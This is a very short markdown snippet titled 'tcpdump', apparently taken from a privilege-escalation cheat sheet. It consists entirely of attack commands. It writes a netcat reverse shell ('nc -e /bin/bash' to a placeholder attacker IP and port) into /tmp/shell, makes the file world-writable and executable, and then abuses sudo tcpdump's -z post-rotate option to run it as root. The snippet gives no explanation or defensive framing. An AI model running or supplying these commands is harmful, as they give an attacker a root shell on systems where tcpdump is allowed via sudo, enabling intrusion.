# tcpdump
```
cd /tmp
echo "nc -e /bin/bash <attacker_IP> <port>" > shell
chmod 777 shell
sudo tcpdump -ln -I eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell -Z root
```
